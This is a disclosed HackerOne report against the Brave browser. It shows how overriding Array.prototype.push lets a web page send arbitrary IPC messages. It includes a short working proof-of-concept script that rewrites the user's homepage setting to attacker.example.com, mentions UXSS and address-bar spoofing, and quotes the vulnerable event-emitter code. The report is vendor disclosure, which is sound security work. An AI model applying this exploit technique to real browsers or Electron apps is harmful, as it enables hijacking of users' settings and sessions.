# Sending arbitrary IPC messages via overriding Array.prototype.push

## Report Details
- **Report ID**: 188561
- **URL**: https://hackerone.com/reports/188561
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2016-12-06T01:43:30.507Z
- **Disclosed**: 2018-09-18T18:15:36.258Z

## Reporter
- **Username**: masatokinugawa
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: brave

## Vulnerability Information
## Summary:
This bug is similar to #187542 and #188086.
I found that also `Array.prototype.push` is exploitable.

## Tested on: 
Brave	0.12.12

## Steps To Reproduce:
1. Go to this page: https://vulnerabledoma.in/brave/settings_change3.html 
```
<script>
Array.prototype.push=function(e){
	this[0]=function(e,f){
		e.sender.send("dispatch-action",'{"actionType":"app-change-setting","key":"general.homepage","value":"http://attacker.example.com/"}');
	}
}
</script>

<embed src=".swf"></embed>
```

2. See `about:preferences`. You can confirm that your home page is changed to `http://attacker.example.com/`.

Also an attacker can do UXSS and address bar spoofing using this bug. Please see #187542's PoC .

#Technical Details

This `push` in the `event_emitter.js` is overwritten: 
```
EventEmitter2.prototype.on = function (event, fn) {
  this._callbacks = this._callbacks || {};
  (this._callbacks['$' + event] = this._callbacks['$' + event] || [])
    .push(fn);
  return this;
};
```

Could you confirm this bug?
Thanks!

## Attachments
No attachments
